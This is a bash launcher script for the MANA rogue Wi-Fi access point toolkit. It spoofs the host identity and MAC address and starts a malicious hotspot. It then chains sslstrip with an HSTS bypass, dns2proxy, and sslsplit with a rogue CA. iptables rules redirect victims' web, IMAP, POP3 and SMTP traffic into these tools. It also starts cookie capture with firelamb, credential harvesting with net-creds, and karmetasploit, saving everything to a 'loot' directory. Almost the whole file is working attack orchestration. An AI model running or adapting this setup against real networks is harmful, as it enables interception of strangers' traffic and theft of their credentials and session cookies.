#!/bin/bash
#info: https://sensepost.com/blog/2013/rogue-access-points-a-how-to/
source $(cd $(dirname $0); pwd -P)/_custom_functions.sh

upstream=eth0
phy=wlan0


endclr='\e[m'
txtblk='\e[0;30m' # Black   - Regular
txtred='\e[0;31m' # Red     - Regular
txtgrn='\e[0;32m' # Green   - Regula
#$txtblk $endclr
#$txtgrn $endclr
check_ap_mode(){
 if ! iw list | grep 'AP$'>/dev/null
  then
   echo -e "$txtgrn [*] Cannot find interface supporting: AP-mode!$endclr"
   echo -e "$txtred  [?] Continue anyway?(y/n)$endclr"
    read -p "[>]" ans
     case "$ans" in
      n|N|no|No|NO) echo -e "$txtred [X] Exiting...$endclr"; exit ;;
      y|Y|yes|Yes|YES) echo -e "$txtgrn [*] Continuing...$endclr" ;;
     esac
 fi
}

start_hostname(){
	hostname WRT54G
	echo -e "$txtgrn [*] Changed hostname to: WRT54G$endclr"
	sleep 2
}

clearwifi(){
	service network-manager stop
	rfkill unblock wlan
}

start_macchanger(){
read -t 5 -p "Changing mac in 5 seconds, type x to skip [>]" ans
 case $ans in
  x|X) echo -e "\n $txtgrn [*] Skipping macchange.." ;;
  *) ifconfig "$phy" down; macchanger -r "$phy"; ifconfig "$phy" up ;;
 esac
}

start_hostapd(){
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
}

start_dnsmasq(){
	dnsmasq --bind-interfaces --conf-file=$etc/dnsmasq-dhcpd.conf --interface=$phy --except-interface=lo #--port=0
}

start_nat_firewall(){
        echo '1' > /proc/sys/net/ipv4/ip_forward
        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -F
        iptables -t nat -F
        iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
        iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
        iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
#        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
}

start_sslstrip(){
        cd $share/sslstrip-hsts/sslstrip2/
        python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
        iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
        cd $share/sslstrip-hsts/dns2proxy/
        python dns2proxy.py -i $phy&
        cd -
}

start_sslsplit(){
        sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
         https 0.0.0.0 10443 \
         http 0.0.0.0 10080 \
         ssl 0.0.0.0 10993 \
         tcp 0.0.0.0 10143 \
         ssl 0.0.0.0 10995 \
         tcp 0.0.0.0 10110 \
         ssl 0.0.0.0 10465 \
         tcp 0.0.0.0 10025&
#        iptables -t nat -A INPUT -i $phy \
#         -p tcp --destination-port 80 \
#         -j REDIRECT --to-port 10080
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 443 \
         -j REDIRECT --to-port 10443
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 143 \
         -j REDIRECT --to-port 10143
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 993 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 65493 \
         -j REDIRECT --to-port 10993
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 465 \
         -j REDIRECT --to-port 10465
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 25 \
         -j REDIRECT --to-port 10025
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 995 \
         -j REDIRECT --to-port 10995
        iptables -t nat -A PREROUTING -i $phy \
         -p tcp --destination-port 110 \
         -j REDIRECT --to-port 10110
}

start_firelamb(){
        $share/firelamb/firelamb.py -i $phy &
}

start_netcreds(){
        python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
}

start_msfconsole(){
        sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
        msfconsole -r $etc/karmetasploit.rc&
}

hangon(){
        echo -e "\n"
        echo -e "$txtgrn [*]The captured traffic will be in $loot \n $endclr"
        echo -e "$txtgrn [*]and $etc/run-mana/credentials.txt \n $endclr"
        echo -e "$txtred [>] Hit enter to kill me $endclr"
         read
}

killem(){
        echo -e "$txtred [X] [*] Killing....$endclr"
        service apache2 stop

        pkill -f airbase
        pkill -f dhcpd
        pkill -f start_dnsmasq
        pkill -f dnsspoof
        pkill -f dnsmasq
        pkill -f dns2proxy
        pkill -f firelamb
        pkill -f start_firelamb
        pkill -f hostapd
        pkill -f start_hostapd
#        pkill -f msfconsole
#        pkill -f start_msfconsole
        pkill -f start_nat_firewall
        pkill -f net-creds
        pkill -f nodogsplash
#        pkill -f python
#        pkill -f ruby
        pkill -f sslsplit
        pkill -f sslstrip
        pkill -f stunnel4
        pkill -f tinyproxy

        rm --verbose --force $EXNODE
        rm --verbose --force /tmp/crackapd.run

        iptables --policy INPUT ACCEPT
        iptables --policy FORWARD ACCEPT
        iptables --policy OUTPUT ACCEPT
        iptables -t nat -F
echo -e "$txtred [*] Dont forget to kill msfconsole $endclr"
exit
}


start-nat-full(){
echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
 ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
echo -e "$txtgrn [*] Changing hostname $endclr"
 ./$0 --start_hostname   #Change systems hostname
echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
 ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
echo -e "$txtgrn [*] Changing MAC $endclr"
 ./$0 --start_macchanger #Change mac
  sleep 4
echo -e "$txtgrn [*] Starting hostapd $endclr"
 ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
  sleep 5
echo -e "$txtgrn [*] Starting dnsmasq $endclr"
 ./$0 --start_dnsmasq &&    #Dnsmasq - 
  sleep 5
echo -e "$txtgrn [*] Starting sslstrip $endclr"
 ./$0 --start_sslstrip &&   #SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
  sleep 2
echo -e "$txtgrn [*] Starting sslsplit $endclr"
 ./$0 --start_sslsplit &   #Sslsplit - 
  sleep 5
echo -e "$txtgrn [*] Starting nat-firewall $endclr"
 ./$0 --start_nat_firewall && #Nat firewall - 
  sleep 2
echo -e "$txtgrn [*] Starting firelamb $endclr"
 ./$0 --start_firelamb & #Firelamb - Captures and writes cookies to a firefox profile for easy use.
  sleep 5
echo -e "$txtgrn [*] Starting netcreds $endclr"
 ./$0 --start_netcreds &  #Netcreds - 
#echo -e "$txtgrn [*] Starting msfconsole $endclr"
# $TERM_ -hold -T "start_msfconsole"      $TOPLEFTBIG -e "bash -c '$0 --start_msfconsole'"  & sleep 2 && #Metasploit -
#  sleep 2
#echo -e "$txtgrn [*] Starting crackapd $endclr"
# ./$0 --start_crackapd & #Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
#  sleep 2
#echo -e "$txtgrn [*] Starting apache $endclr"
# ./$0 --start_apache &   #Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley

	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

start-nat-simple(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit

}

start-noupstream(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

start-noupstream-eap(){
	hangon && #Wait for Enter key
	killem	  #Kill all shit and exit
}

start_nodogsplash(){
#nodogsplash="$etc/nodogsplash/nodogsplash_x86_x64_kali"
DATENOW="$(date "+%s")"

echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
 ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
echo -e "$txtgrn [*] Changing hostname $endclr"
 ./$0 --start_hostname   #Change systems hostname
echo -e "$txtgrn [*] Stopping newtork-manager & unblocking wifi $endclr"
 ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi

 echo Starting Apache
  service apache2 start

 echo -e "$txtgrn [*] Changing mac $endclr"
ifconfig $phy down
macchanger -r $phy         #randomise our MAC
iw reg set BO                      #change our regulatory domain to something more permissive
ifconfig $phy up

# echo Starting Airbase
#airbase-ng -c6 -a E96162AC5BBC -e "Internet" -v $phy&

echo -e "$txtgrn [*] Starting nodogsplash $endclr"
nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
#  $nodogsplash -f -c /etc/nodogsplash/nodogsplash.conf &
  sleep 9
#echo -e "$txtgrn [*] Starting hostapd $endclr"
hostapd /etc/hostapd/hostapd.conf
# ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
  sleep 5
echo -e "$txtgrn [*] Starting dnsmasq $endclr"
 ./$0 --start_dnsmasq &&    #Dnsmasq -
  sleep 5
echo -e "$txtgrn [*] Starting nat-firewall $endclr"
 ./$0 --start_nat_firewall && #Nat firewall -
  sleep 2
#brctl addbr br0
#brctl addif br0 eth0              #Assuming eth0 is your upstream interface
#brctl addif br0 wlan2
#ifconfig br0 up

#SSLStrip with HSTS bypass
 echo Starting sslstrip
  cd $share/sslstrip-hsts/sslstrip2/
   python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.$DATENOW&
  cd $share/sslstrip-hsts/dns2proxy/
  python dns2proxy.py -i $phy&
 cd -

#SSLSplit
 echo Starting sslsplit
 sslsplit -D -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.$DATENOW \
 https 0.0.0.0 10443 \
 ssl 0.0.0.0 10993 \
 tcp 0.0.0.0 10143 \
 ssl 0.0.0.0 10995 \
 tcp 0.0.0.0 10110 \
 ssl 0.0.0.0 10465 \
 tcp 0.0.0.0 10025&

 iptables -t nat -D PREROUTING 1
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10000
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 443 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10443
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 143 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10143
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 993 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10993
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 465 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10465
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 25 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10025
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 995 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10995
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 110 -m mark --mark 0x400/0x700 -j REDIRECT --to-port 10110
 iptables -t nat -A PREROUTING -i $phy -m mark --mark 0x200/0x700 -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -m mark --mark 0x400/0x700 -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -d 0.0.0.0/0 -p tcp --dport 53 -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -d 0.0.0.0/0 -p udp --dport 53 -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -d 10.0.0.1 -p tcp --dport 80 -j ACCEPT
 iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:2050
 iptables -t nat -A PREROUTING -i $phy -j ACCEPT

## Start FireLamb
# echo Starting FireLamb
# $share/firelamb/firelamb.py -i $phy --karma_sslsplit $loot/sslsplit -s $loot/sslsplit-connect.log.$DATENOW&

#End..
 hangon && #Wait for Enter key
 killem    #Kill all shit and exit
}

# ============================================================ #
# ================== < Startup & Shutdown > ================== #
# ============================================================ #
usage(){
echo "$FUNCNAME"
    echo $"""
 Usage: $(basename "$0") [-f] [--start-nat-full]      - Will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.
 Usage: $(basename "$0") [-s] [--start-nat-simple     - Will fire up MANA in NAT mode, but without any of the firelamb, sslstrip, sslsplit etc.
 Usage: $(basename "$0") [-n] [--start-noupstream     - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
 Usage: $(basename "$0") [-e] [--start-noupstream-eap - Will start MANA with the EAP attack and noupstream mode.

 Usage: $(basename "$0") [--check_ap_mode]            - Check if "AP-mode" supported interface is present
 Usage: $(basename "$0") [--start_hostname]           - Change systems hostname
 Usage: $(basename "$0") [--clearwifi]                - Stop network-manager &rfkill unblock wifi
 Usage: $(basename "$0") [--start_macchanger]         - Change mac
 Usage: $(basename "$0") [--start_hostapd]            - Hostapd - Start modified hostapd that implements new mana attacks
 Usage: $(basename "$0") [--start_dnsmasq]            - Dnsmasq - 
 Usage: $(basename "$0") [--start_sslstrip]           - SSLStrip with HSTS bypass - sslstrip-hsts: Modification of LeonardoNVE's & moxie's tools
 Usage: $(basename "$0") [--start_sslsplit]           - Sslsplit - Tool for man-in-the-middle attacks against SSL/TLS encrypted network connections.
 Usage: $(basename "$0") [--start_nat_firewall]       - Nat firewall - 
 Usage: $(basename "$0") [--start_firelamb]           - Firelamb - Captures and writes cookies to a firefox profile for easy use.
 Usage: $(basename "$0") [--start_netcreds]           - Netcreds - 
 Usage: $(basename "$0") [--msfconsole]               - Msfconsole
 Usage: $(basename "$0") [--start_crackapd]           - Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
 Usage: $(basename "$0") [--start_apache]             - Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley

 Usage: $(basename "$0") [-e] [--edit]   | Edit this file.
 Usage: $(basename "$0") [-h] [--help]   | Print this help.
"
}

# ============= < Argument Loaded Configurables > ============ #
if [ $# = 0 ]; then
  usage
 exit 1
fi

ACNT=1
for ARG in $@
 do
  ACNT=$((ACNT + 1))
  case $ARG in
   #Sub launchers
      --check_ap_mode)  	   check_ap_mode        ;;
      --start_hostname)  	   start_hostname       ;;
      --clearwifi)  	           clearwifi            ;;
      --start_macchanger)          start_macchanger     ;;
      --start_hostapd)  	   start_hostapd        ;;
      --start_dnsmasq)  	   start_dnsmasq        ;;
      --start_nat_firewall)  	   start_nat_firewall   ;;
      --start_sslstrip)  	   start_sslstrip       ;;
      --start_sslsplit)  	   start_sslsplit       ;;
      --start_firelamb)  	   start_firelamb       ;;
      --start_netcreds)  	   start_netcreds       ;;
      --start_msfconsole)	   start_msfconsole     ;;
      --hangon)  		   hangon               ;;
      --killem)  		   killem               ;;
   #Main launchers
      -f|--start-nat-full)         start-nat-full       ;;
      -s|--start-nat-simple)       start-nat-simple     ;;
      -n|--start-noupstream)       start-noupstream     ;;
      -e|--start-noupstream-eap)   start-noupstream-eap ;;
      -d|--start_nodogsplash)      start_nodogsplash    ;;
   #Other
      -e|--edit)                   nano "$0" ; exit     ;;
      -h|--help)                   usage    ; break    ;;
      --)                          shift     ; break    ;;
       *) echo -e "$txtred [x] Bad Option: $1 $endclr" && usage; exit 1   ;;
  esac
done

exit
